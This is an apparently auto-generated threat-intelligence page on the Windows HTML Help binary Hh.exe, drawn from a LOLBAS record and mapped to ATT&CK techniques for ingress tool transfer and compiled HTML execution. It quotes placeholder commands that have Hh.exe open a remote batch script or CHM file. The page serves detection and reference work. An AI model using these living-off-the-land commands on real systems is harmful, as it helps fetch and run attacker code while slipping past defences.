---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Hh.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `hh.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Hh.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Binary used for processing chm files in Windows

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/hh.md)
- Source verification: [source record](../../sources/lolbas/hh.exe.md)

## Aliases

- `Hh.exe`
- `hh.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: HH.exe {REMOTEURL:.bat} |
| [T1218.001 - Compiled HTML File](../../attack/techniques/T1218.001-compiled-html-file.md) | explicit | source | Command metadata lists T1218.001: HH.exe {REMOTEURL:.chm} |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/hh.exe.md)

## Source Verification

[source record](../../sources/lolbas/hh.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@oddvarmoe'
Person: Oddvar Moe
Author: Oddvar Moe
Commands:
- Category: Download
Command: HH.exe {REMOTEURL:.bat}
Description: Open the target batch script with HTML Help.
```
